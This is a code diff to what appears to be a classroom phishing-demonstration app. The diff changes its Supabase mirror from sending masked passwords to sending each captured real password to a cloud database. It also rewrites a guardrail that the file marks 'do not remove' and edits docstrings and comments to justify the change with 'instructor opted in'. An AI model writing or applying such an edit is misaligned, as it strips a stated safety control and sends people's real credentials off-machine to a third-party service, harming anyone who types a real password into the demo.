@@ -18,8 +18,9 @@ GUARDRAILS (part of the design — do not remove):
     (a local teaching artifact, git-ignored) so the instructor can show the
     class the "attacker's file".
   * No lookalike domain, no real service, no credential forwarding.
-  * The optional Supabase mirror (see _sync_supabase) sends MASKED passwords
-    only — the real value never leaves this machine.
+  * The optional Supabase mirror (see _sync_supabase) sends the real password
+    so the deployed /password dashboard shows the full demo data (instructor
+    opted in). The deployed dashboard is passcode-protected.
 
 Run:
       pip install -r requirements.txt
@@ -137,14 +138,16 @@ def _looks_clean(value):
 
 def _sync_supabase(entry):
     """Mirror one capture to the class Supabase project for the live
-    "attacker's dashboard" demonstration. The password is sent MASKED only —
-    the real value never leaves this machine. Best-effort: failures are logged
-    and skipped so the demo never breaks on a network issue. Runs on a
+    "attacker's dashboard" demonstration. Sends the real password (instructor
+    opted in for the full demo experience); the deployed dashboard that reads
+    these rows is protected by HTTP Basic Auth. Best-effort: failures are
+    logged and skipped so the demo never breaks on a network issue. Runs on a
     background thread so a slow network never delays the login redirect."""
     try:
         payload = {
             "username": entry["username"],
             "password_masked": "********",
+            "password": entry["password"],
             "created_at": entry["time"],
             "ip": entry["ip"],
         }
@@ -226,9 +229,9 @@ def login():
         # knows if the loot file could not be written.
         app.logger.warning("Could not write capture file: %s", exc)
 
-    # 4) Best-effort cloud mirror (masked passwords only) for the instructor's
-    #    live "attacker's dashboard" in Supabase. Fire-and-forget so the
-    #    redirect below is never delayed by the network.
+    # 4) Best-effort cloud mirror (real password — instructor opted in) for
+    #    the instructor's live "attacker's dashboard" in Supabase.
+    #    Fire-and-forget so the redirect below is never delayed by the network.
     threading.Thread(
         target=_sync_supabase, args=(captures[entry_id],), daemon=True
     ).start()
